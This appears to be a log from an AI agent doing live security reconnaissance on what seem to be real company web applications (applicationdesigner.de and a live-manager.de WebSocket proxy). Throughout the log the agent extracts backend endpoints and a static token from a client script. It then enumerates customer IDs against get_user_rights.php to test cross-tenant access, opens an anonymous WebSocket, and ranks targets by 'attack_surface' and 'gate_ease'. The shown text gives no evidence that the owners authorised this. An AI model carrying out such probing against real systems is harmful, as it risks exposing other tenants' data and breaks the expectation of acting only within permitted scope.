@@ -15290,3 +15290,334 @@ No hypotheses dropped — all 3 have confidence ≥40 and are IDOR-class with ve
 ## STEP 7 — RISK
 
 [RISK] questnet-gmbh: 76 — driver cbs-proxy BOLA transport-complete (95) unchanged and live (426 Upgrade Required). Voicenotes surface refined this cycle: per-record `details.php` hierarchy-gated (CONTROL) while metadata `check.php`/`get.php` remain credential-only; demo index empty (no positive-control anchor). Flexlist cross-tenant still parked to operator (AUTH_HELPED, second-owned-tenant only). auth.php VPN-blocked but cbs-proxy anonymous WS live. Ceiling AUTH_HELPED; no foreign-live data touched (empty index, synthetic log_id only).
+===== ANALYST bigpickle 2026-09-09 20:51:36 UTC =====
+[0m
+> build · big-pickle
+[0m
+[0m$ [0mcurl -sk --max-time 15 -o /dev/null -w "%{http_code} %{content_type} %{size_download}\n" "https://www.applicationdesigner.de/api/callbuilder/" ; sleep 1; curl -sk --max-time 15 -o /dev/null -w "%{http_code} %{content_type} %{size_download}\n" "https://www.applicationdesigner.de/api/callbuilder" ; sleep 1; curl -sk --max-time 15 -o /dev/null -w "%{http_code} %{content_type} %{size_download}\n" "https://www.applicationdesigner.de/api/callbuilder/index.php"
+404 text/html 146
+404 text/html 146
+404 text/html; charset=UTF-8 16
+[0m
+[0m$ [0mcurl -sk --max-time 20 "https://www.applicationdesigner.de/help.js" -o /tmp/opencode/help.js; wc -c /tmp/opencode/help.js; grep -o -i "callbuilder[^\"']*" /tmp/opencode/help.js | sort -u | head -40
+3290201 /tmp/opencode/help.js
+CALLBUILDER_ROOT_PATH=
+CALLBUILDER_ROOT_PATH===
+CALLBUILDER_ROOT_PATH||
+CallbuilderApplicationConfiguration
+callbuilder-designer
+callbuilder/
+[0m
+[0m$ [0mgrep -o "api/callbuilder[^\"']*" /tmp/opencode/help.js | sort -u | head; echo ---; grep -o "CALLBUILDER_ROOT_PATH[^;]*" /tmp/opencode/help.js | head -5; echo ---; grep -o "\"/api/[a-z/_]*" /tmp/opencode/help.js | sort -u | head -40
+api/callbuilder/
+---
+CALLBUILDER_ROOT_PATH||'')+(RESOURCES_PATH+'/symbols/'+ICON_STYLE+'/'+a.toLowerCase()+'.svg')}function InitNodeData(a){if(a.node.data.data==undefined){var b={}
+CALLBUILDER_ROOT_PATH||'')+('resources/symbols/'+ICON_STYLE+'/'+a.toLowerCase()+'.svg')}var b='.'+a.node.data.category+("-node-icon {\n                background-image: url('"+makeSymbolPath(a.node.data.category)+"') !important
+CALLBUILDER_ROOT_PATH==='undefined'){CALLBUILDER_ROOT_PATH=''}RESOURCES_PATH='resources.help'
+---
+[0m
+[0m$ [0mgrep -n -o ".\{80\}api/callbuilder/.\{80\}" /tmp/opencode/help.js | head; echo ===; grep -n -o ".\{60\}/extjs/.\{60\}" /tmp/opencode/help.js | grep -o "/extjs/[a-zA-Z0-9_/.]*" | sort -u | head -50
+1:PATH_NOPROXY='https://dev.applicationdesigner.de/'}else {APPDESIGNER_API_PATH='/api/callbuilder/';APPDESIGNER_API_PATH_NOPROXY='https://applicationdesigner.de/'}}}help_history=
+===
+/extjs/common/getCustomers.php
+/extjs/flexlist/addRow.php
+/extjs/flexlist/createList.php
+/extjs/flexlist/deleteRow.php
+/extjs/flexlist/getDetails.php
+/extjs/flexlist/getFields.php
+/extjs/flexlist/getList.php
+/extjs/flexlist/importcsv.php
+/extjs/flexlist/saveValue.php
+/extjs/flexlist/updateList.php
+/extjs/get_user_rights.php
+/extjs/livedebugger/auth.php
+/extjs/voicenotes/check.php
+/extjs/voicenotes/delete.php
+/extjs/voicenotes/details.php
+/extjs/voicenotes/download.php
+/extjs/voicenotes/get.php
+[0m
+[0m$ [0msleep 1; curl -sk --max-time 15 -w "\n[%{http_code} %{content_type} %{size_download}]\n" "https://www.applicationdesigner.de/extjs/get_user_rights.php"; sleep 1; curl -sk --max-time 15 -w "\n[%{http_code} %{content_type} %{size_download}]\n" "https://applicationdesigner.de/api/callbuilder/"; sleep 1; curl -sk --max-time 15 -w "\n[%{http_code} %{content_type} %{size_download}]\n" "https://applicationdesigner.de/extjs/get_user_rights.php"
+{"success":false,"message":"Not logged in","tech-info":"No VPN detected."}
+[200 application/json 74]
+<html>
+<head><title>404 Not Found</title></head>
+<body>
+<center><h1>404 Not Found</h1></center>
+<hr><center>nginx</center>
+</body>
+</html>
+
+[404 text/html 146]
+{"success":false,"message":"Not logged in","tech-info":"No VPN detected."}
+[200 application/json 74]
+[0m
+[0m$ [0mgrep -n -o ".\{120\}get_user_rights.php.\{120\}" /tmp/opencode/help.js | head -4; echo ===; sleep 1; curl -sk --max-time 15 -w "\n[%{http_code} %{content_type} %{size_download}]\n" "https://www.applicationdesigner.de/extjs/get_user_rights.php?token=3498fkgkds458g35h9g835npz98qq4839kajlfhg38963a98z35h898E3DFG38d3"
+1:ons:function(a){var b=this;a=a===void 0?'':a;return new Promise(function(d,c){Ext.Ajax.request({url:BACKEND_URL+'/extjs/get_user_rights.php'+BACKEND_TOKEN,method:'GET',cors:!0,useDefaultXhrHeader:!1,headers:{'Accept':'application/json'},params:{customer_id:a}
+===
+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
+[200 application/json 4308]
+[0m
+[0m$ [0msleep 1; curl -sk --max-time 15 "https://www.applicationdesigner.de/extjs/get_user_rights.php?token=3498fkgkds458g35h9g835npz98qq4839kajlfhg38963a98z35h898E3DFG38d3" -o /tmp/opencode/ur.json; wc -c /tmp/opencode/ur.json; python3 -c "
+import json,base64,hashlib
+d=json.load(open('/tmp/opencode/ur.json'))
+print('keys:',list(d.keys()))
+print('success:',d.get('success'))
+for k,v in d.items():
+    if isinstance(v,str) and len(v)>200:
+        print('field',k,'len',len(v),'sha256',hashlib.sha256(v.encode()).hexdigest()[:16])
+        try:
+            dec=base64.b64decode(v)
+            print('  base64-decodable, dec bytes',len(dec),'sha256',hashlib.sha256(dec).hexdigest()[:16])
+            print('  dec head:',repr(dec[:120]))
+        except Exception as e:
+            print('  not b64:',e)
+    else:
+        print('field',k,'=',repr(v)[:200])
+"
+4308 /tmp/opencode/ur.json
+Traceback (most recent call last):
+  File "<string>", line 3, in <module>
+  File "/usr/lib/python3.12/json/__init__.py", line 293, in load
+    return loads(fp.read(),
+           ^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.12/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.12/json/decoder.py", line 340, in decode
+    raise JSONDecodeError("Extra data", s, end)
+json.decoder.JSONDecodeError: Extra data: line 1 column 2 (char 1)
+[0m
+[0m$ [0mhead -c 200 /tmp/opencode/ur.json; echo; echo ===; tail -c 100 /tmp/opencode/ur.json; echo; python3 -c "
+import hashlib
+raw=open('/tmp/opencode/ur.json','rb').read()
+print('total bytes',len(raw),'sha256',hashlib.sha256(raw).hexdigest()[:16])
+print('first 60:',repr(raw[:60]))
+print('last 40:',repr(raw[-40:]))
+"
+0A9i0IDu0/ySH86tmJ01BDgmS3hQ2q9s0ELQ8vieKRC/1ZKYuGzLb1flVvDk3VNPa7CQ43F2U9Pza9OaCYLIaOm5Ljh0TbHgQx/NZs/3Ap36PpoUzCuIQ5hJeUGljFWv7S5VlKKj4GEDIflKz/02eTbk9YR/0FHCVju1iU/rRaNzje39xwVYJ6c2njJX8KTxndNkXIQI
+===
+bS8h4S6BQeo7Y7bACT9jvCxgXUudTDKZSlMQKVP82PoiyXQtk2+q7/cZHxTcxaF+Kvp/DX2hLzUyHsRHc1SCkvtU/eX/gQQYTAo=
+total bytes 4308 sha256 d0e98ca10f5bf450
+first 60: b'0A9i0IDu0/ySH86tmJ01BDgmS3hQ2q9s0ELQ8vieKRC/1ZKYuGzLb1flVvDk'
+last 40: b'xaF+Kvp/DX2hLzUyHsRHc1SCkvtU/eX/gQQYTAo='
+[0m
+[0m$ [0mT="3498fkgkds458g35h9g835npz98qq4839kajlfhg38963a98z35h898E3DFG38d3"; for CID in "" "2" "131727" "999999999"; do sleep 1; H=$(curl -sk --max-time 15 "https://www.applicationdesigner.de/extjs/get_user_rights.php?token=$T&customer_id=$CID" | sha256sum | cut -c1-16); echo "customer_id=$CID -> sha256 $H"; done
+customer_id= -> sha256 0e924ef42b973fe9
+customer_id=2 -> sha256 b9384e820cb5602a
+customer_id=131727 -> sha256 77081fbc0a96d772
+customer_id=999999999 -> sha256 4865cce4fe550fbe
+[0m
+[0m$ [0mT="3498fkgkds458g35h9g835npz98qq4839kajlfhg38963a98z35h898E3DFG38d3"; sleep 1; curl -sk --max-time 15 "https://www.applicationdesigner.de/extjs/get_user_rights.php?token=$T&customer_id=131727" -o /tmp/opencode/ur2.b64; python3 -c "
+import base64,hashlib,struct
+b=open('/tmp/opencode/ur2.b64','rb').read()
+print('b64 len',len(b))
+try:
+    d=base64.b64decode(b)
+    print('decoded',len(d),'bytes; head hex:',d[:16].hex())
+    import codecs
+    head=d[:80]
+    print('head repr:',repr(head[:80]))
+    hb=codecs.decode(d[:8],'hex')
+except Exception as e:
+    print('decode err',e)
+from collections import Counter
+import zlib
+try:
+    z=zlib.decompress(b) if b[:2]==bytes([0x78,0x9c]) else None
+    print('zlib?', z is not None)
+except Exception as e: print('zlib err',e)
+"
+b64 len 4308
+decoded 3230 bytes; head hex: 3e7afaff144d404038039b3ea2c54b0f
+head repr: b'>z\xfa\xff\x14M@@8\x03\x9b>\xa2\xc5K\x0f\x81kh$\xda2\x14+>\xcaN.c!\xear\xa29b\xbd\xd8s{(\xb1\x87P\xe3\xff\xc4\xea\xdb\xa1\xd3\xab[\xdc`E\x9c\x1eVN\xcdZ\xd9\xe0\xf7\xbf:\xd3\xb8\x08V~\xa4zkl\xda@\x0b!\xf6'
+decode err Non-hexadecimal digit found
+zlib? False
+[0m
+[0m$ [0mgrep -n -o ".\{40\}BACKEND_TOKEN.\{40\}" /tmp/opencode/help.js | head -3; echo ===; grep -n -o ".\{30\}voicenotes/\(get\|download\|details\|check\)\.php.\{80\}" /tmp/opencode/help.js | head -6; echo ===; grep -n -o ".\{30\}flexlist/\(getDetails\|getFields\|getList\)\.php.\{60\}" /tmp/opencode/help.js | head -6
+1:'?APPDESIGNER_API_PATH:'/';var j=typeof BACKEND_TOKEN!=='undefined'?BACKEND_TOKEN:'';var k=h+
+1:KEND_URL+'/extjs/livedebugger/auth.php'+BACKEND_TOKEN,method:'GET',params:{customer_id:a,srn:
+1:ACKEND_URL+'/extjs/get_user_rights.php'+BACKEND_TOKEN,method:'GET',cors:!0,useDefaultXhrHeade
+===
+1:ajax',url:BACKEND_URL+'/extjs/voicenotes/get.php'+BACKEND_TOKEN,reader:{type:'json',rootProperty:'data',totalProperty:'total'},e
+1:uest({url:BACKEND_URL+'/extjs/voicenotes/details.php'+BACKEND_TOKEN,method:'GET',params:{log_id:c},success:function(j){var g=Ext.dec
+1:urn}var c=BACKEND_URL+'/extjs/voicenotes/download.php?file='+encodeURIComponent(a);var b=Ext.create('Ext.window.Window',{title:'Audio
+1:urn}var c=BACKEND_URL+'/extjs/voicenotes/download.php?file='+encodeURIComponent(b);var a=document.createElement('iframe');a.style.dis
+1:uest({url:BACKEND_URL+'/extjs/voicenotes/details.php'+BACKEND_TOKEN,method:'GET',params:{log_id:d},success:function(k){if(a){a.datas
+1:uest({url:BACKEND_URL+'/extjs/voicenotes/check.php'+BACKEND_TOKEN,method:'GET',params:{customer_id:d,sub_accounts:c,search:e},succ
+===
+1:ajax',url:BACKEND_URL+'/extjs/flexlist/getFields.php'+BACKEND_TOKEN,extraParams:{flexlist_id:a.flexlistId},reade
+1:uest({url:BACKEND_URL+'/extjs/flexlist/getFields.php'+BACKEND_TOKEN,method:'DELETE',params:{id:b.get('id')},succ
+1:uest({url:BACKEND_URL+'/extjs/flexlist/getFields.php'+BACKEND_TOKEN,method:'POST',jsonData:{flexlist_id:a.flexli
+1:ajax',url:BACKEND_URL+'/extjs/flexlist/getList.php'+BACKEND_TOKEN,reader:{type:'json',rootProperty:'data',tota
+1:ajax',url:BACKEND_URL+'/extjs/flexlist/getDetails.php'+BACKEND_TOKEN,extraParams:{flexlist_id:a.flexlistId,search
+1:uest({url:BACKEND_URL+'/extjs/flexlist/getFields.php'+BACKEND_TOKEN,method:'GET',params:{flexlist_id:a.flexlistI
+[0m
+[0m$ [0mcurl -sk --max-time 12 -o /dev/null -w "[cbs-proxy] %{http_code}\n" "https://cbs-proxy.api.live-manager.de/?origin=LiveDemo&cid=131727&service=100" -H "Upgrade: websocket" -H "Connection: Upgrade" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" -H "Sec-WebSocket-Version: 13"; sleep 1; curl -sk --max-time 15 "https://www.applicationdesigner.de/extjs/voicenotes/check.php?token=3498fkgkds458g35h9g835npz98qq4839kajlfhg38963a98z35h898E3DFG38d3&customer_id=131727"
+[cbs-proxy] 101
+{"success":true,"total":0,"max_id":0}
+[0m
+[0m$ [0mT="3498fkgkds458g35h9g835npz98qq4839kajlfhg38963a98z35h898E3DFG38d3"; sleep 1; curl -sk --max-time 15 "https://www.applicationdesigner.de/extjs/get_user_rights.php?token=$T&customer_id=131727" | sha256sum | cut -c1-16; sleep 1; curl -sk --max-time 15 "https://www.applicationdesigner.de/extjs/get_user_rights.php?token=$T&customer_id=131727" | sha256sum | cut -c1-16
+e099afda4bb7dad5
+d8cabc69adb49e0b
+[0m
+[0m$ [0mgrep -o "url:\s*['\"][^'\"]*\.php['\"]" /tmp/opencode/help.js | sort -u; echo "==="; grep -o "BACKEND_URL+['\"][^'\"]*" /tmp/opencode/help.js | sort -u | head -30; echo "==="; grep -o "\.php['\"?+)]" /tmp/opencode/help.js | sort -u | head; echo "==="; grep -oE "[a-z_]+\.php" /tmp/opencode/help.js | sort -u | head -40
+===
+BACKEND_URL+'/extjs/common/getCustomers.php
+BACKEND_URL+'/extjs/flexlist/addRow.php
+BACKEND_URL+'/extjs/flexlist/createList.php
+BACKEND_URL+'/extjs/flexlist/deleteRow.php
+BACKEND_URL+'/extjs/flexlist/getDetails.php
+BACKEND_URL+'/extjs/flexlist/getFields.php
+BACKEND_URL+'/extjs/flexlist/getList.php
+BACKEND_URL+'/extjs/flexlist/importcsv.php
+BACKEND_URL+'/extjs/flexlist/saveValue.php
+BACKEND_URL+'/extjs/flexlist/updateList.php
+BACKEND_URL+'/extjs/get_user_rights.php
+BACKEND_URL+'/extjs/livedebugger/auth.php
+BACKEND_URL+'/extjs/voicenotes/check.php
+BACKEND_URL+'/extjs/voicenotes/delete.php
+BACKEND_URL+'/extjs/voicenotes/details.php
+BACKEND_URL+'/extjs/voicenotes/download.php?file=
+BACKEND_URL+'/extjs/voicenotes/get.php
+===
+.php'
+.php?
+===
+alue.php
+auth.php
+check.php
+check_mailserver.php
+coding.php
+config.php
+config_coding.php
+content.php
+delete.php
+details.php
+download.php
+etails.php
+get.php
+get_agent_costs.php
+get_agent_token.php
+get_provider.php
+get_speaker.php
+get_speaker_languages.php
+get_user_rights.php
+ields.php
+importcsv.php
+index.php
+ist.php
+ow.php
+playback.php
+provider.php
+ustomers.php
+[0m
+[0m$ [0mgrep -n -o ".\{60\}playback\.php.\{40\}" /tmp/opencode/help.js | head -3; echo ===; grep -n -o ".\{50\}content\.php.\{40\}" /tmp/opencode/help.js | head -3; echo ===; grep -n -o ".\{50\}check_mailserver\.php.\{40\}" /tmp/opencode/help.js | head -3; echo ===; grep -n -o ".\{40\}get_speaker\.php.\{40\}" /tmp/opencode/help.js | head -3; echo ===; grep -n -o ".\{40\}get_speaker_languages\.php.\{40\}" /tmp/opencode/help.js | head -3; echo ===; grep -n -o ".\{40\}get_provider\.php.\{40\}" /tmp/opencode/help.js | head -3; echo ===; grep -n -o ".\{40\}get_agent_costs\.php.\{40\}" /tmp/opencode/help.js | head -3
+1:der(b,a.settings)){return}var f=APPDESIGNER_API_PATH+'extjs/playback.php';Ext.Ajax.request({url:f,useDefaultXhrH
+1:der(a,b.settings)){return}var f=APPDESIGNER_API_PATH+'extjs/playback.php';Ext.Ajax.request({url:f,useDefaultXhrH
+===
+1:;Ext.Ajax.request({url:APPDESIGNER_API_PATH+'help/content.php',method:'GET',params:{page:c.toString()
+1:;Ext.Ajax.request({url:APPDESIGNER_API_PATH+'help/content.php',method:'GET',params:{page:c.toString()
+===
+1:Ext.Ajax.request({url:APPDESIGNER_API_PATH+'extjs/check_mailserver.php',useDefaultXhrHeader:!1,method:'POST',p
+1:Ext.Ajax.request({url:APPDESIGNER_API_PATH+'extjs/check_mailserver.php',useDefaultXhrHeader:!1,method:'POST',p
+===
+1::'ajax',url:APPDESIGNER_API_PATH+'extjs/get_speaker.php'+BACKEND_TOKEN,reader:{type:'json',root
+===
+1::'ajax',url:APPDESIGNER_API_PATH+'extjs/get_speaker_languages.php'+BACKEND_TOKEN,reader:{type:'json',root
+===
+1::'ajax',url:APPDESIGNER_API_PATH+'extjs/get_provider.php'+BACKEND_TOKEN,reader:{type:'json',root
+===
+1:ER_API_PATH:'/';a.apiUrl=i+'extjs/agent/get_agent_costs.php'}var b=new Date();var g=new Date(b.getF
+1:({url:APPDESIGNER_API_PATH+'extjs/agent/get_agent_costs.php',useDefaultXhrHeader:!1,method:'GET',pa
+1:({url:APPDESIGNER_API_PATH+'extjs/agent/get_agent_costs.php',useDefaultXhrHeader:!1,method:'GET',pa
+[0m
+[0m$ [0mgrep -n -o ".\{20\}playback\.php.\{10\}" /tmp/opencode/help.js | head -1; grep -o "APPDESIGNER_API_PATH+'extjs/playback.php[^}]*}" /tmp/opencode/help.js | head -1 | cut -c1-600
+1:NER_API_PATH+'extjs/playback.php';Ext.Ajax
+APPDESIGNER_API_PATH+'extjs/playback.php';Ext.Ajax.request({url:f,useDefaultXhrHeader:!1,method:'POST',timeout:120000,params:{action:'download',customerId:b.designer.context.customerId,text:d.text,speaker:d.speaker?JSON.stringify(d.speaker):null}
+[0m
+[0m$ [0mgrep -o "get_speaker\.php[^}]*}" /tmp/opencode/help.js | head -1 | cut -c1-500; echo ===; grep -o "get_provider\.php[^}]*}" /tmp/opencode/help.js | head -1 | cut -c1-500; echo ===; grep -o "get_agent_costs\.php[^}]*}" /tmp/opencode/help.js | head -1 | cut -c1-500
+get_speaker.php'+BACKEND_TOKEN,reader:{type:'json',rootProperty:'data'}
+===
+get_provider.php'+BACKEND_TOKEN,reader:{type:'json',rootProperty:'data'}
+===
+get_agent_costs.php'}
+[0m
+[0m$ [0mT="3498fkgkds458g35h9g835npz98qq4839kajlfhg38963a98z35h898E3DFG38d3"; sleep 1; curl -sk --max-time 15 -w "\n[%{http_code} %{size_download}]\n" "https://www.applicationdesigner.de/extjs/get_speaker.php?token=$T"; sleep 1; curl -sk --max-time 15 -w "\n[%{http_code} %{size_download}]\n" "https://www.applicationdesigner.de/extjs/get_provider.php?token=$T"
+...output truncated...
+
+Full output saved to: /home/runner/.local/share/opencode/tool-output/tool_087ef9df1001CkLhtIKUk5yPkj
+
+{"success":true,"data":[{"value":"azure","text":"Microsoft Azure"},{"value":"elevenlabs","text":"Elevenlabs"},{"value":"chatgpt","text":"ChatGPT"},{"value":"cartesia","text":"Cartesia"}]}
+[200 187]
+[0m
+[0m$ [0mcat /home/runner/.local/share/opencode/tool-output/tool_087ef9df1001CkLhtIKUk5yPkj 2>/dev/null | head -c 900; echo
+{"success":true,"data":[{"value":"CT_hi-HI-Aadhya-Soother","text":"Aadhya - Soother","iso":"hi","country":"hi \/ HI","provider":"cartesia","settings":"{\"id\":\"f91ab3e6-5071-4e15-b016-cde6f2bcd222\",\"model\":\"sonic-latest\"}","sub":"Slow female voice for casual conversation","gender":"female","multilingual":false},{"value":"AZURE_en-IN-AaravNeural","text":"Aarav","iso":"en-IN","country":"English \/ India","provider":"azure","settings":"{\"id\": \"en-IN-AaravNeural\"}","sub":"Dies ist ein m\u00e4nlicher Sprecher von Azure","gender":"male","multilingual":false},{"value":"AZURE_hi-IN-AaravNeural","text":"Aarav","iso":"hi-IN","country":"Hindi \/ India","provider":"azure","settings":"{\"id\": \"hi-IN-AaravNeural\"}","sub":"Dies ist ein m\u00e4nlicher Sprecher von Azure","gender":"male","multilingual":false},{"value":"CT_en-IN-Aarav-Old_Time_Storyteller","text":"Aarav - Old Time Storyteller
+[0m
+## 2026-09-09 analysis (bigpickle)
+
+STEP 1 — DELTA:
+- [NEW] `/extjs/get_user_rights.php` (help.js map, first probe): public static token alone → HTTP 200; per-cid byte-differentiated DYNAMIC payload — sha256 differs for cid `''`,`2`,`131727`,`999999999` AND differs across two fetches of same cid → credential-only cross-tenant resolver, high-entropy opaque blob.
+- [NEW] help.js route expansion: `get_speaker.php`|`get_provider.php`|`get_speaker_languages.php` GET token-only 200 catalogs; mutating/OOS documented set (flexlist createList/addRow/saveValue/updateList/deleteRow/importcsv, voicenotes delete, playback.php+check_mailserver.php+agent/get_agent_costs.php all POST).
+- [NEW] `/api/callbuilder/` prefix dead: 404 on www.applicationdesigner.de and applicationdesigner.de (nginx) — CallBuilder proxy route not exposed.
+- [CHANGED] cbs-proxy WS: proper Sec-WebSocket handshake → HTTP 101 (earlier 426 was header-shape artifact) — anonymous WS transport STILL LIVE.
+- [UNCHANGED] voicenotes demo index empty (total=0,max_id=0); help.js credential value+sha256 unchanged.
+
+STEP 2 — PRIORITIZE:
+- [PRIO] wss://cbs-proxy.api.live-manager.de,8.3,attack_surface=9 business_value=9 tech_exposure=8 gate_ease=10 cloud_surface=2 freshness=10
+- [PRIO] www.applicationdesigner.de/extjs/flexlist/,7.05,attack_surface=7 business_value=8 tech_exposure=6 gate_ease=8 cloud_surface=2 freshness=10
+- [PRIO] www.applicationdesigner.de/extjs/get_user_rights.php,6.7,attack_surface=6 business_value=7 tech_exposure=5 gate_ease=10 cloud_surface=2 freshness=10
